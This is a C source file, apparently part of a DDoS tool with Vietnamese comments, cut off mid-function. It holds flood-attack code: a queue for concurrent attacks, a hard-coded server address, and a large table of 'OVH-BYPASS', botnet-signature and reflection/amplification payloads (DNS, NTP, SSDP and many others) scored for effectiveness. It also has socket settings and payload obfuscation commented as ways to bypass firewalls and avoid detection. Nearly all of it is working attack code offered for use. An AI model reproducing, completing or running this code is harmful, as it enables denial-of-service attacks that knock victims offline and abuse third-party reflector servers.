#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sched.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <ctype.h> // Thêm thư viện này

// Tối ưu lại các thông số để tránh quá tải
#define PAYLOAD_SIZE 1472  // Giữ nguyên 1472
#define BURST_SIZE 128     // Giảm từ 256 xuống 128 để tiết kiệm RAM
#define SOCKETS_PER_THREAD 2  // Giảm từ 4 xuống 2 để tiết kiệm resources
#define SOCKET_BUFFER_SIZE (4 * 1024 * 1024)  // Giảm từ 8MB xuống 4MB
#define MAX_THREADS 32     // Giảm từ 64 xuống 32
#define MAX_BURST 256      // Giảm từ 512 xuống 256
#define MAX_PAYLOADS 3000  // Giảm từ 5000 xuống 3000
#define MIN_PORT 1024
#define MAX_PORT 65535
#define THREAD_MULTIPLIER 1  // Giữ nguyên 1
#define MAX_SOCKETS 512   // Giảm từ 1024 xuống 512
#define MEGA_BATCH 512    // Giảm từ 1024 xuống 512
#define BURST_MULTIPLIER 8 // Giảm từ 16 xuống 8
#define RING_BUFFER_SIZE 131072  // Giảm từ 262144 xuống 131072
#define SERVER_IP "45.117.80.93"
#define SERVER_PORT 3000
#define BUF_SIZE 2048

// Thêm thông số để kiểm soát CPU load
#define CPU_LOAD_THRESHOLD 75  // Giảm từ 80 xuống 75 để tối ưu hơn
#define SLEEP_INTERVAL 500     // Giảm từ 1000 xuống 500 microseconds
#define BURST_INTERVAL 50      // Giảm từ 100 xuống 50 microseconds
#define MEMORY_CHUNK_SIZE 4096 // Tối ưu memory allocation
#define THREAD_STACK_SIZE 2097152 // Giảm stack size từ 4MB xuống 2MB

// Thêm thông số cho bypass và queue management
#define MAX_CONCURRENT_ATTACKS 3  // Tăng từ 2 lên 3 cuộc tấn công đồng thời
#define BYPASS_ROTATION_INTERVAL 50  // Số burst trước khi đổi bypass pattern

// Forward declarations
typedef struct {
    char ip_dest[64];
    int port;
    int duration;
    int threads;
    int packet_size;
    int burst_size;
    char method[32];
} config_t;

// Cấu trúc quản lý attack queue
typedef struct {
    config_t config;
    time_t start_time;
    int duration;
    int active;
    pid_t pid;
} attack_entry_t;

void encrypt_payload(unsigned char *buffer, int len, uint8_t key);
void obfuscate_payload(unsigned char *buffer, int len);
void generate_layer7_payload(unsigned char *buffer);
int add_attack_to_queue(config_t *cfg);
void remove_attack_from_queue(int slot);
void cleanup_finished_attacks();
void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx);
int select_optimal_bypass_pattern(int burst_count, int consecutive_failures);
void generate_smart_bypass_payload(unsigned char *buffer, int burst_count, int consecutive_failures);
void generate_optimized_hex_payload(unsigned char *buffer, int burst_count);
void generate_gudp_payload(unsigned char *buffer, int burst_count);
void generate_dns_payloads(void);
void generate_gudp_payloads(void);
unsigned short checksum(unsigned short *buf, int len);
void* flood_worker_bypass(void *arg);
void* flood_thread_pps_enhanced(void *arg);

// Thêm biến global để theo dõi CPU load
volatile int current_cpu_load = 0;
pthread_mutex_t cpu_load_mutex = PTHREAD_MUTEX_INITIALIZER;
volatile int running = 1;  // Di chuyển khai báo này lên đây

// Global attack queue
attack_entry_t attack_queue[MAX_CONCURRENT_ATTACKS];
pthread_mutex_t attack_queue_mutex = PTHREAD_MUTEX_INITIALIZER;
int current_attacks = 0;

// Enhanced bypass patterns - Comprehensive payload system
typedef struct {
    char name[64];
    char payload[256];
    int length;
    int effectiveness;
    int category; // 0=spoofed, 1=valid, 2=other
} enhanced_bypass_pattern_t;

enhanced_bypass_pattern_t enhanced_bypass_patterns[] = {
    // Spoofed IP Attacks
    {"OVH-BYPASS/1", "\xfe\xfe\xfe\xfe", 4, 95, 0},
    {"OVH-BYPASS/2", "\x4a\x4a\x4a\x4a", 4, 90, 0},
    {"Flood of 0xFF", "\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff", 11, 85, 0},
    {"Flood of 0x00", "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 19, 80, 0},
    {"UDP getstatus Flood", "\x67\x65\x74\x73\x74\x61\x74\x75\x73", 9, 85, 0},
    {"OVH-BYPASS/UDP-HEX", "\x4f\x56\x48\x2d\x42\x4f\x54\x4e\x45\x54", 10, 95, 0},
    {"OVH-BYPASS/VSE", "\xff\xff\xff\xff\x56\x53\x45\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00", 25, 90, 0},
    
    // Valid IP Attacks
    {"Mirai Variant/1", "\x47\x6f\x6f\x64\x62\x79\x65", 7, 85, 1},
    {"Mirai Variant/2", "\x41\x41\x41\x41", 4, 80, 1},
    {"Qbot/1", "\x51\x42\x4f\x54\x2d\x4e\x45\x54", 8, 85, 1},
    {"Legion UDP", "\x4c\x45\x47\x49\x4f\x4e", 6, 80, 1},
    {"Chaos UDP", "\x43\x48\x41\x4f\x53\x20\x42\x59\x50\x41\x53\x53", 12, 85, 1},
    {"TCP SYN Flood/Custom-MSS", "\x02\x00\x00\x00\x05\xb4", 6, 90, 1},
    {"TCP SYN Flood/Window-Scale", "\x02\x00\x00\x0c\x07\x14", 6, 90, 1},
    {"TeamSpeak Status Flood", "\x54\x53\x33\x49\x4e\x49", 6, 80, 1},
    {"VSE Flood/1", "\x17\x09\x09\x32\x37\x30\x31\x35", 8, 85, 1},
    {"UDPMIX DNS Flood", "\x70\x65\x61\x63\x65\x63\x6f\x72\x70", 9, 80, 1},
    {"Hex UDP Flood", "\x2f\x78", 2, 75, 1},
    {"Known Botnet UDP Flood/1", "\x52\x79\x4d\x47\x61\x6e\x67", 7, 85, 1},
    {"Known Botnet UDP Flood/2", "\xa6\xc3\x00", 3, 80, 1},
    {"OpenVPN Reflection", "\x17\x09\x09\x31\x31\x39\x34", 7, 90, 1},
    {"RRSIG DNS Query Reflection", "\x00\x2e\x00\x01", 4, 85, 1},
    {"ANY DNS Query Reflection", "\x00\xff\x00\x01", 4, 85, 1},
    {"NTP Reflection", "\x17\x09\x09\x31\x32\x33", 6, 90, 1},
    {"Chargen Reflection", "\x17\x09\x09\x31\x39", 5, 85, 1},
    {"MDNS Reflection", "\x17\x09\x09\x35\x33\x35\x33", 7, 85, 1},
    {"BitTorrent Reflection", "\x17\x09\x09\x36\x38\x38\x31", 7, 85, 1},
    {"CLDAP Reflection", "\x17\x09\x09\x33\x38\x39", 6, 85, 1},
    {"STUN Reflection", "\x17\x09\x09\x33\x34\x37\x38", 7, 85, 1},
    {"MSSQL Reflection", "\x17\x09\x09\x31\x34\x33\x34", 7, 85, 1},
    {"SNMP Reflection", "\x17\x09\x09\x31\x36\x31", 6, 85, 1},
    {"WSD Reflection", "\x17\x09\x09\x33\x37\x30\x32", 7, 85, 1},
    {"DTLS Reflection", "\x17\x09\x09\x34\x34\x33\x09\x09\x34\x30", 10, 85, 1},
    {"OpenAFS Reflection", "\x17\x09\x09\x37\x30\x30\x31", 7, 85, 1},
    {"ARD Reflection", "\x17\x09\x09\x33\x32\x38\x33", 7, 85, 1},
    {"BFD Reflection", "\x17\x09\x09\x33\x37\x38\x34", 7, 85, 1},
    {"SSDP Reflection", "\x17\x09\x09\x31\x39\x30\x30", 7, 85, 1},
    {"ArmA Reflection/1", "\x17\x09\x09\x32\x33\x30\x32", 7, 85, 1},
    {"ArmA Reflection/2", "\x17\x09\x09\x32\x33\x30\x33", 7, 85, 1},
    {"vxWorks Reflection", "\x17\x09\x09\x31\x37\x31\x38\x35", 9, 85, 1},
    {"Plex Reflection", "\x17\x09\x09\x33\x32\x34\x31\x34", 9, 85, 1},
    {"TeamSpeak Reflection", "\x17\x09\x09\x39\x39\x38\x37", 8, 85, 1},
    {"Lantronix Reflection", "\x17\x09\x09\x33\x30\x37\x31\x38", 9, 85, 1},
    {"DVR IP Reflection", "\x17\x09\x09\x33\x37\x38\x31\x30", 9, 85, 1},
    {"Jenkins Reflection", "\x17\x09\x09\x33\x33\x38\x34\x38", 9, 85, 1},
    {"Citrix Reflection", "\x17\x09\x09\x31\x36\x30\x34", 8, 85, 1},
    {"NAT-PMP Reflection", "\x00\x80\x00", 3, 85, 1},
    {"Memcache Reflection", "\x17\x09\x09\x31\x31\x32\x31\x31", 9, 85, 1},
    {"NetBIOS Reflection", "\x17\x09\x09\x31\x33\x37", 6, 85, 1},
    {"SIP Reflection", "\x17\x09\x09\x35\x30\x36\x30", 7, 85, 1},
    {"Digiman Reflection", "\x17\x09\x09\x32\x33\x36\x32", 7, 85, 1},
    {"Crestron Reflection", "\x17\x09\x09\x34\x31\x37\x39\x34", 9, 85, 1},
    {"CoAP Reflection", "\x17\x09\x09\x35\x36\x38\x33", 7, 85, 1},
    {"BACnet Reflection", "\x17\x09\x09\x34\x37\x38\x30\x38", 9, 85, 1},
    {"FiveM Reflection", "\x17\x09\x09\x33\x30\x31\x32\x30", 9, 85, 1},
    {"Modbus Reflection", "\x17\x09\x09\x35\x30\x32", 6, 85, 1},
    {"QOTD Reflection", "\x17\x09\x09\x31\x37", 5, 85, 1},
    {"ISAKMP Reflection", "\x17\x09\x09\x35\x30\x30", 6, 85, 1},
    {"XDMCP Reflection", "\x17\x09\x09\x31\x37\x37", 6, 85, 1},
    {"IPMI Reflection", "\x17\x09\x09\x36\x32\x33", 6, 85, 1},
    {"Apple serialnumberd Reflection", "\x17\x09\x09\x36\x32\x36", 7, 85, 1},
    {"TCP Reflection from HTTPS/1", "\x00\x00\x00\x12\x09\x09\x34\x34\x33", 9, 90, 1},
    {"TCP Reflection from HTTPS/2", "\x00\x00\x00\x10\x09\x09\x34\x34\x33", 9, 90, 1},
    {"TCP Reflection from HTTP/1", "\x00\x00\x00\x12\x09\x09\x38\x30", 8, 90, 1},
    {"TCP Reflection from HTTP/2", "\x00\x00\x00\x10\x09\x09\x38\x30", 8, 90, 1},
    {"TCP Reflection from BGP/1", "\x00\x00\x00\x12\x09\x09\x31\x37\x39", 9, 90, 1},
    {"TCP Reflection from BGP/2", "\x00\x00\x00\x10\x09\x09\x31\x37\x39", 9, 90, 1},
    {"TCP Reflection from SMTP/1", "\x00\x00\x00\x12\x09\x09\x34\x36\x35", 9, 90, 1},
    {"TCP Reflection from SMTP/2", "\x00\x00\x00\x10\x09\x09\x34\x36\x35", 9, 90, 1},
    {"Apple serial number Reflection", "\x17\x09\x09\x36\x32\x36", 7, 85, 1},
    {"TSource Engine Query", "\x54\x53\x6f\x75\x72\x63\x65", 7, 85, 1},
    
    // Other Attacks
    {"ICMP", "\x01\x09\x09", 3, 80, 2},
    {"ICMP Dest Unreachable", "\x01\x2c\x31\x37\x09\x09", 6, 85, 2},
    {"GRE", "\x34\x37\x09\x09", 4, 80, 2},
    {"IPX", "\x31\x31\x31\x09\x09", 5, 75, 2},
    {"AH", "\x35\x31\x09\x09", 4, 80, 2},
    {"ESP", "\x35\x30\x09\x09", 4, 80, 2},
    {"TCP SYN-ACK", "\x00\x00\x00\x12", 4, 90, 2},
    {"TCP PSH-ACK", "\x00\x00\x00\x18", 4, 90, 2},
    {"TCP RST-ACK", "\x00\x00\x00\x14", 4, 90, 2},
    {"TCP FIN", "\x00\x00\x00\x01", 4, 85, 2},
    {"TCP SYN", "\x00\x00\x00\x02", 4, 90, 2},
    {"TCP PSH", "\x00\x00\x00\x08", 4, 85, 2},
    {"TCP URG", "\x00\x00\x00\x20", 4, 80, 2},
    {"TCP RST", "\x00\x00\x00\x04", 4, 85, 2},
    {"TCP ACK", "\x00\x00\x00\x10", 4, 85, 2},
    {"Unset TCP Flags", "\x00\x00\x00\x00", 4, 75, 2},
    {"TCP SYN-ECN-CWR", "\x00\x00\x00\xc2", 4, 90, 2},
    {"TCP SYN-ECN", "\x00\x00\x00\x42", 4, 90, 2},
    {"TCP SYN-CWR", "\x00\x00\x00\x82", 4, 90, 2},
    {"TCP SYN-PSH-ACK-URG", "\x00\x00\x00\x3a", 4, 90, 2},
    {"TCP SYN-ACK-ECN-CWR", "\x00\x00\x00\xd2", 4, 90, 2},
    {"TCP PSH-ACK-URG", "\x00\x00\x00\x38", 4, 90, 2},
    {"TCP FIN-SYN-RST-PSH-ACK-URG", "\x00\x00\x00\x3f", 4, 90, 2},
    {"TCP RST-ACK-URG-CWR-Reserved", "\x00\x00\x04\xb4", 4, 90, 2},
    {"TCP SYN-PSH-URG-ECN-CWR-Reserved", "\x00\x00\x04\xea", 4, 90, 2},
    {"TCP FIN-RST-PSH-ECN-CWR-Reserved", "\x00\x00\x0c\xcd", 4, 90, 2},
    {"TCP FIN-RST-PSH-ACK-URG-ECN-CWR-Reserved", "\x00\x00\x0c\xfd", 4, 90, 2},
    
    // Legacy bypass patterns converted to new format
    {"Legacy OVH-BYPASS/1", "\xc0\xaf", 2, 85, 0},
    {"Legacy OVH-BYPASS/2", "\xe0\x80\xaf", 3, 90, 0},
    {"Legacy OVH-BYPASS/3", "\xf0\x80\x80\xaf", 4, 95, 0},
    {"Legacy VSE Query", "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65", 11, 80, 0},
    {"Legacy Null Pattern", "\x00\x00\x10\x00\x00\x00\x00\x00", 8, 75, 0},
    {"Legacy NTP Query", "\x17\x00\x03\x2a", 4, 70, 0},
    {"Legacy DNS Query", "\x00\x01\x00\x00\x00\x01\x00\x00\x67\x65\x74\x73", 12, 85, 0},
    {"Legacy CRLF", "\x0d\x0a", 2, 60, 0},
    {"Legacy Null Byte", "\x00", 1, 50, 0},
    {"Legacy BOM", "\xff\xfe", 2, 65, 0},
    {"Legacy Spaces", "\x20\x20\x20\x20", 4, 70, 0},
    {"Legacy Tabs", "\x09\x09\x09\x09", 4, 75, 0},
    {"Legacy Line Endings", "\x0a\x0d\x0a\x0d", 4, 80, 0},
    {"Legacy Null Bytes", "\x00\x00\x00\x00\x00\x00\x00\x00", 8, 85, 0},
    {"Legacy Full Bytes", "\xff\xff\xff\xff\xff\xff\xff\xff", 8, 90, 0},
    {"Legacy DEL Chars", "\x7f\x7f\x7f\x7f", 4, 75, 0},
    {"Legacy ESC Chars", "\x1b\x1b\x1b\x1b", 4, 70, 0},
    {"Legacy Backspace", "\x08\x08\x08\x08", 4, 65, 0},
    {"Legacy Form Feed", "\x0c\x0c\x0c\x0c", 4, 70, 0},
    {"Legacy Vertical Tab", "\x0b\x0b\x0b\x0b", 4, 75, 0}
};

// Hàm kiểm tra CPU load
int get_cpu_usage() {
    static unsigned long long lastTotalUser, lastTotalUserLow, lastTotalSys, lastTotalIdle;
    unsigned long long totalUser, totalUserLow, totalSys, totalIdle, total;
    
    FILE* file = fopen("/proc/stat", "r");
    if (file == NULL) return 0;
    
    fscanf(file, "cpu %llu %llu %llu %llu", &totalUser, &totalUserLow, &totalSys, &totalIdle);
    fclose(file);
    
    if (lastTotalUser == 0) {
        lastTotalUser = totalUser;
        lastTotalUserLow = totalUserLow;
        lastTotalSys = totalSys;
        lastTotalIdle = totalIdle;
        return 0;
    }
    
    unsigned long long diffUser = totalUser - lastTotalUser;
    unsigned long long diffUserLow = totalUserLow - lastTotalUserLow;
    unsigned long long diffSys = totalSys - lastTotalSys;
    unsigned long long diffIdle = totalIdle - lastTotalIdle;
    
    lastTotalUser = totalUser;
    lastTotalUserLow = totalUserLow;
    lastTotalSys = totalSys;
    lastTotalIdle = totalIdle;
    
    total = diffUser + diffUserLow + diffSys + diffIdle;
    if (total == 0) return 0;
    
    int percent = (int)((diffUser + diffUserLow + diffSys) * 100 / total);
    return percent;
}

// Hàm cập nhật CPU load
void update_cpu_load() {
    int load = get_cpu_usage();
    pthread_mutex_lock(&cpu_load_mutex);
    current_cpu_load = load;
    pthread_mutex_unlock(&cpu_load_mutex);
}

// Hàm kiểm tra xem có nên tạm dừng không
int should_pause() {
    pthread_mutex_lock(&cpu_load_mutex);
    int load = current_cpu_load;
    pthread_mutex_unlock(&cpu_load_mutex);
    return load > CPU_LOAD_THRESHOLD;
}

// Thread monitor CPU load
void* cpu_monitor_thread(void *arg) {
    while (running) {
        update_cpu_load();
        usleep(100000);  // Cập nhật mỗi 100ms
    }
    return NULL;
}

// Thread monitor attack queue
void* attack_queue_monitor_thread(void *arg) {
    while (running) {
        cleanup_finished_attacks();
        usleep(500000);  // Kiểm tra mỗi 500ms
    }
    return NULL;
}

char *rhexstring[] = {
    "\x00", "\x01", "\x02", "\x03", "\x04", "\x05", "\x06", "\x07",
    "\x08", "\x09", "\x0a", "\x0b", "\x0c", "\x0d", "\x0e", "\x0f",
    "\x10", "\x11", "\x12", "\x13", "\x14", "\x15", "\x16", "\x17",
    "\x18", "\x19", "\x1a", "\x1b", "\x1c", "\x1d", "\x1e", "\x1f",
    "\x20", "\x21", "\x22", "\x23", "\x24", "\x25", "\x26", "\x27",
    "\x28", "\x29", "\x2a", "\x2b", "\x2c", "\x2d", "\x2e", "\x2f",
    "\x30", "\x31", "\x32", "\x33", "\x34", "\x35", "\x36", "\x37",
    "\x38", "\x39", "\x3a", "\x3b", "\x3c", "\x3d", "\x3e", "\x3f",
    "\x40", "\x41", "\x42", "\x43", "\x44", "\x45", "\x46", "\x47",
    "\x48", "\x49", "\x4a", "\x4b", "\x4c", "\x4d", "\x4e", "\x4f",
    "\x50", "\x51", "\x52", "\x53", "\x54", "\x55", "\x56", "\x57",
    "\x58", "\x59", "\x5a", "\x5b", "\x5c", "\x5d", "\x5e", "\x5f",
    "\x60", "\x61", "\x62", "\x63", "\x64", "\x65", "\x66", "\x67",
    "\x68", "\x69", "\x6a", "\x6b", "\x6c", "\x6d", "\x6e", "\x6f",
    "\x70", "\x71", "\x72", "\x73", "\x74", "\x75", "\x76", "\x77",
    "\x78", "\x79", "\x7a", "\x7b", "\x7c", "\x7d", "\x7e", "\x7f",
    "\x80", "\x81", "\x82", "\x83", "\x84", "\x85", "\x86", "\x87",
    "\x88", "\x89", "\x8a", "\x8b", "\x8c", "\x8d", "\x8e", "\x8f",
    "\x90", "\x91", "\x92", "\x93", "\x94", "\x95", "\x96", "\x97",
    "\x98", "\x99", "\x9a", "\x9b", "\x9c", "\x9d", "\x9e", "\x9f",
    "\xa0", "\xa1", "\xa2", "\xa3", "\xa4", "\xa5", "\xa6", "\xa7",
    "\xa8", "\xa9", "\xaa", "\xab", "\xac", "\xad", "\xae", "\xaf",
    "\xb0", "\xb1", "\xb2", "\xb3", "\xb4", "\xb5", "\xb6", "\xb7",
    "\xb8", "\xb9", "\xba", "\xbb", "\xbc", "\xbd", "\xbe", "\xbf",
    "\xc0", "\xc1", "\xc2", "\xc3", "\xc4", "\xc5", "\xc6", "\xc7",
    "\xc8", "\xc9", "\xca", "\xcb", "\xcc", "\xcd", "\xce", "\xcf",
    "\xd0", "\xd1", "\xd2", "\xd3", "\xd4", "\xd5", "\xd6", "\xd7",
    "\xd8", "\xd9", "\xda", "\xdb", "\xdc", "\xdd", "\xde", "\xdf",
    "\xe0", "\xe1", "\xe2", "\xe3", "\xe4", "\xe5", "\xe6", "\xe7",
    "\xe8", "\xe9", "\xea", "\xeb", "\xec", "\xed", "\xee", "\xef",
    "\xf0", "\xf1", "\xf2", "\xf3", "\xf4", "\xf5", "\xf6", "\xf7",
    "\xf8", "\xf9", "\xfa", "\xfb", "\xfc", "\xfd", "\xfe", "\xff"
};

typedef struct {
    char pattern[64];
    int length;
} bypass_pattern_t;

bypass_pattern_t bypass_patterns[] = {
    {{"\xc0\xaf"}, 2}, {{"\xe0\x80\xaf"}, 3}, {{"\xf0\x80\x80\xaf"}, 4},
    {{"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65"}, 11},
    {{"\x00\x00\x10\x00\x00\x00\x00\x00"}, 8}, {{"\x17\x00\x03\x2a"}, 4},
    {{"\x00\x01\x00\x00\x00\x01\x00\x00\x67\x65\x74\x73"}, 12},
    {{"\x0d\x0a"}, 2}, {{"\x00"}, 1}, {{"\xff\xfe"}, 2}
};

// Hàm quản lý attack queue
int add_attack_to_queue(config_t *cfg) {
    pthread_mutex_lock(&attack_queue_mutex);
    
    if (current_attacks >= MAX_CONCURRENT_ATTACKS) {
        pthread_mutex_unlock(&attack_queue_mutex);
        return 0; // Queue đầy
    }
    
    // Tìm slot trống
    int slot = -1;
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (!attack_queue[i].active) {
            slot = i;
            break;
        }
    }
    
    if (slot == -1) {
        pthread_mutex_unlock(&attack_queue_mutex);
        return 0; // Không có slot trống
    }
    
    // Thêm attack vào queue
    attack_queue[slot].config = *cfg;
    attack_queue[slot].start_time = time(NULL);
    attack_queue[slot].duration = cfg->duration;
    attack_queue[slot].active = 1;
    attack_queue[slot].pid = 0;
    
    current_attacks++;
    printf("[*] Attack added to queue. Current attacks: %d/%d\n", current_attacks, MAX_CONCURRENT_ATTACKS);
    
    pthread_mutex_unlock(&attack_queue_mutex);
    return 1;
}

void remove_attack_from_queue(int slot) {
    pthread_mutex_lock(&attack_queue_mutex);
    
    if (slot >= 0 && slot < MAX_CONCURRENT_ATTACKS && attack_queue[slot].active) {
        attack_queue[slot].active = 0;
        current_attacks--;
        printf("[*] Attack removed from queue. Current attacks: %d/%d\n", current_attacks, MAX_CONCURRENT_ATTACKS);
    }
    
    pthread_mutex_unlock(&attack_queue_mutex);
}

void cleanup_finished_attacks() {
    pthread_mutex_lock(&attack_queue_mutex);
    
    time_t current_time = time(NULL);
    for (int i = 0; i < MAX_CONCURRENT_ATTACKS; i++) {
        if (attack_queue[i].active) {
            if (current_time - attack_queue[i].start_time >= attack_queue[i].duration) {
                attack_queue[i].active = 0;
                current_attacks--;
                printf("[*] Attack finished and removed from queue. Current attacks: %d/%d\n", current_attacks, MAX_CONCURRENT_ATTACKS);
            }
        }
    }
    
    pthread_mutex_unlock(&attack_queue_mutex);
}

// Hàm cải tiến bypass
void generate_enhanced_bypass_payload(unsigned char *buffer, int pattern_idx) {
    int num_patterns = sizeof(enhanced_bypass_patterns) / sizeof(enhanced_bypass_pattern_t);
    
    if (pattern_idx < num_patterns) {
        // Sử dụng payload từ hệ thống mới
        memcpy(buffer, enhanced_bypass_patterns[pattern_idx].payload, 
               enhanced_bypass_patterns[pattern_idx].length);
        
        // Thêm padding để đạt PAYLOAD_SIZE
        int offset = enhanced_bypass_patterns[pattern_idx].length;
        for (int i = offset; i < PAYLOAD_SIZE; i++) {
            buffer[i] = rhexstring[i % 256][0];
        }
        
        // Thêm các kỹ thuật bypass nâng cao dựa trên category
        int category = enhanced_bypass_patterns[pattern_idx].category;
        
        if (category == 0) { // Spoofed IP Attacks
            // Thêm random spoofing patterns
            for (int i = 0; i < PAYLOAD_SIZE; i += 32) {
                if (rand() % 10 == 0) {
                    buffer[i] = 0xfe; // OVH bypass
                }
                if (rand() % 15 == 0) {
                    buffer[i] = 0x4a; // OVH bypass 2
                }
            }
        } else if (category == 1) { // Valid IP Attacks
            // Thêm reflection attack patterns
            for (int i = 0; i < PAYLOAD_SIZE; i += 64) {
                if (rand() % 20 == 0) {
                    buffer[i] = 0x17; // UDP protocol
                    if (i + 1 < PAYLOAD_SIZE) buffer[i + 1] = 0x09; // Tab
                }
            }
        } else if (category == 2) { // Other Attacks
            // Thêm TCP flags và protocol patterns
            for (int i = 0; i < PAYLOAD_SIZE; i += 128) {
                if (rand() % 25 == 0) {
                    buffer[i] = 0x02; // TCP SYN
                }
                if (rand() % 30 == 0) {
                    buffer[i] = 0x01; // ICMP
                }
            }
        }
        
        // Thêm layer7 payload ngẫu nhiên
        if (rand() % 8 == 0) {
            generate_layer7_payload(buffer);
        }
        
        // Encrypt và obfuscate
        encrypt_payload(buffer, PAYLOAD_SIZE, rand() % 256);
        obfuscate_payload(buffer, PAYLOAD_SIZE);
        
        // Thêm checksum bypass dựa trên effectiveness
        int effectiveness = enhanced_bypass_patterns[pattern_idx].effectiveness;
        if (effectiveness > 90) {
            buffer[0] = 0xFF;
            buffer[1] = 0xFE;
        } else if (effectiveness > 85) {
            buffer[0] = 0xFE;
            buffer[1] = 0xFE;
        }
        
        // Thêm random null bytes cho high effectiveness patterns
        if (effectiveness > 88) {
            for (int i = 0; i < PAYLOAD_SIZE; i += 16) {
                if (rand() % 5 == 0) {
                    buffer[i] = 0x00;
                }
            }
        }
    } else {
        // Fallback to old method if pattern_idx is out of range
        int offset = 0;
        if (pattern_idx < sizeof(bypass_patterns) / sizeof(bypass_pattern_t)) {
            memcpy(buffer, bypass_patterns[pattern_idx].pattern, 
                   bypass_patterns[pattern_idx].length);
            offset = bypass_patterns[pattern_idx].length;
        }
        
        for (int i = offset; i < PAYLOAD_SIZE; i++) {
            buffer[i] = rhexstring[i % 256][0];
            if (i % 64 == 0) buffer[i] = rand() % 256;
        }
        
        if (rand() % 2) generate_layer7_payload(buffer);
        encrypt_payload(buffer, PAYLOAD_SIZE, rand() % 256);
        obfuscate_payload(buffer, PAYLOAD_SIZE);
    }
}

// Hàm tạo socket với bypass nâng cao
int create_bypass_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    // Tối ưu buffer size
    int sndbuf = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    int rcvbuf = SOCKET_BUFFER_SIZE / 2;
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    
    // Bypass firewall settings
    int priority = 2;  // Giảm priority để tránh detection
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    
    // TOS bypass
    int tos = 0x08;  // Minimize delay
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    
    // Timeout
    struct timeval timeout;
    timeout.tv_sec = 2;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    // Thêm các option bypass khác
    int ttl = 64;
    setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl));
    
    return sock;
}

typedef struct {
    const char *name;
    int port;
    const char *payload;
    int payload_len;
    int amplification_factor;
} amplification_vector_t;

amplification_vector_t amp_vectors[] = {
    {"DNS", 53, "\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\xff\x00\x01", 32, 50},
    {"NTP", 123, "\x17\x00\x03\x2a\x00\x00\x00\x00", 8, 556},
    {"SSDP", 1900, "M-SEARCH * HTTP/1.1\r\nHOST:239.255.255.250:1900\r\nST:ssdp:all\r\nMAN:\"ssdp:discover\"\r\nMX:3\r\n\r\n", 92, 30}
};

char payloads[MAX_PAYLOADS][PAYLOAD_SIZE + sizeof(struct udphdr)];
int payload_lens[MAX_PAYLOADS];
int total_payloads = 0;

typedef struct {
    config_t *cfg;
    int thread_id;
    int cpu_id;
    uint64_t packets_sent;
    uint64_t bytes_sent;
} thread_arg_t;

typedef struct {
    int *sockets;
    int sock_count;
    struct sockaddr_in target;
    int duration;
    int cpu_id;
} thread_data;

typedef struct __attribute__((aligned(64))) {
    struct mmsghdr msgs[BURST_SIZE];
    struct iovec iovecs[BURST_SIZE];
    char *buffers[BURST_SIZE];
    struct sockaddr_in addr;
    int socks[SOCKETS_PER_THREAD];
    int current_sock;
    int pattern_index;
} thread_data_t;

int get_cpu_cores() {
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    if (cores < 1) cores = 1;
    printf("[*] Detected %d CPU cores\n", cores);
    return cores;
}

long get_system_memory() {
    struct sysinfo info;
    sysinfo(&info);
    long total_ram = info.totalram / (1024 * 1024);
    printf("[*] System RAM: %ld MB\n", total_ram);
    return total_ram;
}

int create_optimized_socket() {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) return -1;
    
    // Tối ưu buffer size - giảm để tiết kiệm RAM
    int sndbuf = SOCKET_BUFFER_SIZE;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    
    // Tối ưu receive buffer
    int rcvbuf = SOCKET_BUFFER_SIZE / 4;  // Giảm từ /2 xuống /4
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));
    
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &reuse, sizeof(reuse));
    
    // Giảm priority để tiết kiệm CPU
    int priority = 1;  // Giảm từ 3 xuống 1
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));
    
    // Tối ưu TOS
    int tos = 0x08;  // Giảm từ 0x10 xuống 0x08
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));
    
    // Thêm timeout để tránh blocking vô hạn
    struct timeval timeout;
    timeout.tv_sec = 2;  // Tăng từ 1 lên 2 giây
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    return sock;
}

void generate_hex_payload(unsigned char *buffer, int pattern_idx) {
    int offset = 0;
    if (pattern_idx < sizeof(bypass_patterns) / sizeof(bypass_pattern_t)) {
